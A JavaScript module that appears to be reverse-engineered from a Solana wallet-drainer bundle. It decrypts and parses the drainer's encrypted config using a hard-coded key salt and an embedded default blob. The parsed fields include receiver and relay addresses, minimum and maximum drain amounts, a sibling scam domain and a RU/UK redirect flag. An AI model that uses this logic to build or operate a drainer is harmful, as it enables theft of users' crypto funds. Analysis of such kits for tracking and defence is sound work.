/**
 * rebuilt/core/config_parser.js
 *
 * Parser for the /api/config binary struct.
 *
 * Sources:
 *   - bundle.deobfuscated.js lines 24453–24556 (class 睞, xt() method, 牌() accessor)
 *   - decompiled/live/api_config.plaintext.bin (actual live decrypted bytes)
 *   - decompiled/live/api_config_decoded.json (live captured config)
 *   - AUDIT_AND_ROADMAP.md (B1, B2 bug fixes)
 *
 * Wire format (from /api/config endpoint):
 *   12 bytes   AES-GCM IV
 *   N  bytes   AES-GCM ciphertext
 *
 * Key = SHA-256(apiHost + "B3ui3QZFrOPoGW7oMZgE4A")
 *
 * After AES decryption the plaintext is 160 bytes (live observed):
 *
 *   plaintext[0]:      u8    total_len = 136 (body byte count)
 *   plaintext[1]:      u8    reserved
 *   plaintext[2..137]: body  (total_len bytes)  = 晀 in bundle
 *   plaintext[138..]:  trailer (remaining bytes) = parsed by 牌()
 *
 * The DataView (鯙) is: DataView(plaintext.buffer, 2, total_len)
 * So DataView offset N = plaintext[2+N] = body[N]
 *
 * BODY field offsets (all relative to body = plaintext[2:2+total_len]):
 *   body[0]:      u8    pubkey_count (3)
 *   body[1..2]:   u16 LE  unknown (1000 = 0x03E8)
 *   body[5..36]:  32 bytes pubkey[0] = target token mint  → q
 *   body[37..68]: 32 bytes pubkey[1] = receiver address   → je
 *   body[69..100]:32 bytes pubkey[2] = relay address      → de
 *   body[101]:    u8    g flag
 *   body[102..109]: f64 BE  Oe = MAX_SOL (500.0 in live config)  ← NOTE: Oe=max, ot=min!
 *   body[110..117]: f64 BE  ot = MIN_SOL (1.0 in live config)
 *   body[118]:    u8    Hr flag
 *   body[119]:    u8    jr flag
 *   body[120]:    u8    Kr flag
 *   body[121]:    u8    Xt flag
 *   body[122..123]: u16 LE Zr() = some u16 counter (NOT sibling domain!)
 *   body[124]:    u8    Wr flag
 *   body[125..128]: u32 LE Xr() = some u32 value
 *   body[129]:    u8    J flag (bool)
 *   body[130]:    u8    Gr flag
 *   body[131]:    u8    $r flag (bool)
 *   body[132]:    u8    Yr flag (& 1 → redirect RU/UK)
 *   body[133]:    u8    Vr flag
 *   body[134]:    u8    zr: non-zero means trailer field[5] has keyed entry
 *   body[135]:    u8    Wr2 (used by zr())
 *
 * TRAILER fields (parsed by 牌() / 媵() chain from plaintext[total_len+2:]):
 *   Each field is 1-byte length + that many bytes (or 0x00 = null).
 *   field[0] (嬹.data) = 牌()[0] = Jr().header  = null in live config
 *   field[1] (槙.data) = 牌()[1] = Jr().text    = null in live config
 *   field[2] (齢.data) = 牌()[2] = Qr()         = "trongame.fun" ← SIBLING DOMAIN!
 *   field[3] (腓.data) = 牌()[3] = Fr().ze meta = "USDC" in this config
 *   field[4] (杍.data) = 牌()[4] = en()         = null (token symbol in some configs)
 *   field[5] (镩.data) = 牌()[5] = zr() data    = null
 *
 * VERIFIED against plaintext binary:
 *   Trailer bytes: 00 00 0c 74726f6e67616d652e66756e 04 55534443 00 00
 *   → [null, null, "trongame.fun", "USDC", null, null]
 */

'use strict';

const { base58Encode } = require('./crypto');

/**
 * parseConfig(plaintext: Uint8Array) → config object
 *
 * Returns:
 *   .pubkeyCount   — number of pubkeys (3)
 *   .tokenMint     — target token mint address (base58)
 *   .receiver      — primary receiver address (base58)
 *   .relay         — relay/second receiver (base58)
 *   .maxSol        — MAXIMUM drain amount in SOL (Oe, f64 BE at body[102])
 *   .minSol        — MINIMUM drain amount in SOL (ot, f64 BE at body[110])
 *   .siblingDomain — connect domain hostname (from trailer field[2] = Qr())
 *   .tokenSymbol   — target token symbol (from trailer field[3] or field[4])
 *   .flags         — flag bytes {g,J,Hr,jr,Kr,Xt,Yr,Gr,$r,Vr,Wr,Zr,Xr,zrPresent}
 *   .jr            — Jr() header+text from trailer fields[0,1]
 *   .raw           — original Uint8Array
 */
function parseConfig(plaintext) {
  if (!plaintext || plaintext.length < 10) {
    throw new Error('Config plaintext too short: ' + (plaintext?.length ?? 0));
  }

  const totalLen = plaintext[0];  // body byte count

  // body = plaintext[2:2+totalLen]  (this is what 晀 refers to)
  const body = plaintext.subarray(2, 2 + totalLen);

  // DataView(plaintext.buffer, 2, totalLen) so DV offset N = body[N]
  const dv = new DataView(plaintext.buffer.slice ? plaintext.buffer.slice(0) : plaintext.buffer,
    plaintext.byteOffset + 2, totalLen);

  // 甥(array, offset): read 32-byte pubkey and base58-encode
  function readPubkey(offset) {
    return base58Encode(body.slice(offset, offset + 32));
  }

  // ── Fixed body fields ─────────────────────────────────────────────────
  const pubkeyCount = body[0];
  const unknownU16  = body[1] | (body[2] << 8);  // Br() * 1000 = this, so Br() = this/1000

  // Pubkeys at known offsets (verified against live plaintext)
  const tokenMint = readPubkey(5);    // q  : USDC mint EPjFWdd5...
  const receiver  = readPubkey(37);   // je : active receiver
  const relay     = readPubkey(69);   // de : relay address

  // Flag bytes
  const flagG   = body[101]; // g
  // B1 FIX: Oe = getFloat64(102) = MAX_SOL, ot = getFloat64(110) = MIN_SOL
  const maxSol  = dv.getFloat64(102, false); // Oe = max (500.0 in live)
  const minSol  = dv.getFloat64(110, false); // ot = min (1.0 in live)
  const flagHr  = body[118]; // Hr
  const flagJr  = body[119]; // jr
  const flagKr  = body[120]; // Kr
  const flagXt  = body[121]; // Xt
  const zrU16   = body[122] | (body[123] << 8);  // Zr() = u16 counter
  const flagWr  = body[124]; // Wr
  const xrU32   = body[125] | (body[126] << 8) | (body[127] << 16) | (body[128] << 24); // Xr()
  const flagJ   = !!body[129]; // J
  const flagGr  = body[130]; // Gr
  const flagDR  = !!body[131]; // $r
  const flagYr  = body[132]; // Yr — & 1 triggers RU/UK redirect
  const flagVr  = body[133]; // Vr
  const zrPresent = !!body[134]; // non-zero → trailer field[5] has keyed entry
  const wr2     = body[135]; // Wr2 for zr()

  // ── Trailer fields (B2 FIX: sibling domain and token symbol are here) ──
  // Trailer starts at plaintext[2 + totalLen] = plaintext[totalLen + 2]
  const trailerStart = 2 + totalLen;
  const trailer = plaintext.subarray(trailerStart);
  const trailerFields = parseTrailerFields(trailer, 6);

  // 牌() field mapping:
  //   [0] = Jr().header
  //   [1] = Jr().text
  //   [2] = Qr() = siblingDomain  ← "trongame.fun"
  //   [3] = Fr().ze meta          ← "USDC" in this config
  //   [4] = en() = tokenSymbol    ← null here, non-null in other configs
  //   [5] = zr() keyed entry data
  const jrHeader     = trailerFields[0]; // Jr().header
  const jrText       = trailerFields[1]; // Jr().text
  const siblingDomain = trailerFields[2] || ''; // Qr() = sibling domain
  const frZeMeta     = trailerFields[3] || ''; // Fr().ze
  const tokenSymbol  = trailerFields[4] || frZeMeta || ''; // en() falls back to [3]
  const zrData       = trailerFields[5]; // zr() keyed entry

  return {
    pubkeyCount,
    unknownU16,
    tokenMint,
    receiver,
    relay,
    maxSol,   // Oe = body[102..109] f64 BE (confirmed 500.0)
    minSol,   // ot = body[110..117] f64 BE (confirmed 1.0)
    siblingDomain,  // from trailer field[2] = Qr()
    tokenSymbol,    // from trailer field[4] or [3]
    jrHeader,
    jrText,
    zrPresent,
    zrData,
    flags: {
      g: flagG,
      J: flagJ,
      Hr: flagHr,
      jr: flagJr,
      Kr: flagKr,   // triggers Russian-redirect check when Yr & 1
      Xt: flagXt,
      Yr: flagYr,   // Yr & 1 → 邞() redirect RU/UK browsers to solana.com
      Gr: flagGr,
      $r: flagDR,
      Vr: flagVr,
      Wr: flagWr,
      Zr: zrU16,    // u16 counter
      Xr: xrU32,    // u32 value
    },
    raw: plaintext,
    body,
    trailer,
  };
}

/**
 * parseTrailerFields(trailer, maxFields):
 *   Parse the trailer as a sequence of LV (length-value) fields.
 *   Each field: 1-byte length (0 = null), then that many bytes.
 *   This is what 媵() does in the bundle.
 */
function parseTrailerFields(trailer, maxFields = 6) {
  const fields = [];
  let offset = 0;
  while (offset < trailer.length && fields.length < maxFields) {
    const len = trailer[offset++];
    if (len === 0) {
      fields.push(null);
    } else {
      const data = trailer.slice(offset, offset + len);
      fields.push(new TextDecoder().decode(data));
      offset += len;
    }
  }
  // Pad with nulls if fewer fields than expected
  while (fields.length < maxFields) fields.push(null);
  return fields;
}

/**
 * parseDefaultConfig():
 *   Parse the fallback config baked into the bundle (string table [350]).
 *   Used when /api/config fails all retries.
 *   Has dummy/random pubkeys but valid struct layout.
 */
function parseDefaultConfig() {
  // String[350] from bundle — the緜 variable (deob line 24558)
  const DEFAULT_CONFIG_B64 =
    'iAAD6AMAAMb6evO+2606PWXzaqvJdDGxu+TC0vbg5HymAgNFL11hYGUBswLhgBiS+' +
    'AopefWF+IVdDyA0eQokVfdE+sUD17UnZJe6C7hlkXK3Lt2MZuGPVhdk2chqYQo6fg' +
    '95wLr52wZAf0AAAAAAAD/wAAAAAAAABQAAAAUAAAAAAAAAAAEAAAAAAAALaGV4Zm9t' +
    'by5mdW4EVVNEQwAA';
  const bytes = Uint8Array.from(Buffer.from(DEFAULT_CONFIG_B64, 'base64'));
  return parseConfig(bytes);
}

/**
 * decodeAndParse(rawBlob, apiHost):
 *   AES-GCM decrypt the /api/config wire blob then parse.
 */
async function decodeAndParse(rawBlob, apiHost) {
  const { aesDecrypt } = require('./crypto');
  const plaintext = await aesDecrypt(rawBlob, apiHost);
  return parseConfig(plaintext);
}

/**
 * shouldRedirectRu(config) → boolean
 *   True if Yr & 1 → 邞() fires → redirect to solana.com
 *   (deob line 33627)
 */
function shouldRedirectRu(config) {
  return !!(config.flags.Yr & 1);
}

module.exports = {
  parseConfig,
  parseTrailerFields,
  parseDefaultConfig,
  decodeAndParse,
  shouldRedirectRu,
};
